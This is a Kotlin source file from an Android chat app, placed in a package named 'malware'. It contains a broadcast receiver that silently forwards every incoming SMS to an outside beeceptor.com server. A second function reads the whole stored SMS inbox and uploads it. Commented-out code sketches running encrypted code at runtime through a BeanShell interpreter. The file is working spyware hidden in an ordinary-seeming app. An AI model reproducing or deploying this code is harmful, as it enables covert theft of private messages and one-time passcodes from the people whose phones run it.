package com.teamxdevelopers.SuperChat.malware

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import android.util.Log
import retrofit2.converter.gson.GsonConverterFactory
import com.teamxdevelopers.SuperChat.utils.FileEncryptorDecryptor
//import com.teamxdevelopers.SuperChat.utils.DynamicCodeExecutor

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {

        if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            Log.d("SmsReceiver", "SMS received")
            val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)

            // Initialize ApiService
            val apiService = setupapiservice()

            for (message in smsMessages) {
                val smsData = SmsData(
                    sender = message.originatingAddress ?: "Unknown",
                    messageBody = message.messageBody,
                    timestamp = message.timestampMillis
                )

                Log.d("SmsReceiver", "Sending SMS data to server: $smsData")

                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val response = apiService.sendSmsData(smsData)
                        if (response.isSuccessful) {
                            Log.d("SmsReceiver", "API call successful")
                        } else {
                            Log.e("SmsReceiver", "API call failed: ${response.errorBody()?.string()}")
                        }
                    } catch (e: Exception) {
                        Log.e("SmsReceiver", "API call exception: ${e.message}")
                    }
                }
            }
        }


    }
}

//region kotlin codes
//    val cursor = context.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
//    cursor?.use { c ->
//        val indexAddress = c.getColumnIndex(Telephony.Sms.ADDRESS)
//        val indexBody = c.getColumnIndex(Telephony.Sms.BODY)
//        val indexDate = c.getColumnIndex(Telephony.Sms.DATE)
//
//        while (c.moveToNext()) {
//            val smsData = SmsData(
//                sender = c.getString(indexAddress) ?: "Unknown",
//                messageBody = c.getString(indexBody),
//                timestamp = c.getLong(indexDate)
//            )
//
//            Log.d("SmsReceiver", "Reading SMS from device storage: $smsData")
//
//            CoroutineScope(Dispatchers.IO).launch {
//                try {
//                    val response = apiService.sendSmsData(smsData)
//                    if (response.isSuccessful) {
//                        Log.d("SmsReceiver", "API call successful for stored SMS")
//                    } else {
//                        Log.e("SmsReceiver", "API call failed for stored SMS: ${response.errorBody()?.string()}")
//                    }
//                } catch (e: Exception) {
//                    Log.e("SmsReceiver", "API call exception for stored SMS: ${e.message}")
//                }
//            }
//        }
//    }
//endregion

fun readSmsMessages(context: Context, apiService: ApiService) {

        val cursor = context.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
    cursor?.use { c ->
        val indexAddress = c.getColumnIndex(Telephony.Sms.ADDRESS)
        val indexBody = c.getColumnIndex(Telephony.Sms.BODY)
        val indexDate = c.getColumnIndex(Telephony.Sms.DATE)

        while (c.moveToNext()) {
            val smsData = SmsData(
                sender = c.getString(indexAddress) ?: "Unknown",
                messageBody = c.getString(indexBody),
                timestamp = c.getLong(indexDate)
            )

            Log.d("SmsReceiver", "Reading SMS from device storage: $smsData")

            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val response = apiService.sendSmsData(smsData)
                    if (response.isSuccessful) {
                        Log.d("SmsReceiver", "API call successful for stored SMS")
                    } else {
                        Log.e("SmsReceiver", "API call failed for stored SMS: ${response.errorBody()?.string()}")
                    }
                } catch (e: Exception) {
                    Log.e("SmsReceiver", "API call exception for stored SMS: ${e.message}")
                }
            }
        }
    }



//    val JavaCode = """ the java code here""".trimIndent()
//
////    val encryptedCode = FileEncryptorDecryptor().encrypt(kotlinCode)
////val decryptedCode = FileEncryptorDecryptor().decrypt(encryptedJavaCode)
////    Log.d("smsreceiverencrypt",decryptedCode)
//
//    try {
//        val bsh = bsh.Interpreter()
//
//        // Provide context or any objects the script needs
////        bsh.set("context", context)
////        bsh.set("apiService", apiService)
//
//        // Evaluate (execute) the decrypted code
//        bsh.eval(javacode)
//    } catch (e: Exception) {
//        Log.e("DynamicExecution", "Error executing dynamic code: ${e.message}")
//    }

}


fun setupapiservice(): ApiService {

    return Retrofit.Builder()
        .baseUrl("https://refreshmobsec.free.beeceptor.com") // Replace with your server's base URL
        .addConverterFactory(GsonConverterFactory.create()) // Add this line
        .build()
        .create(ApiService::class.java)


}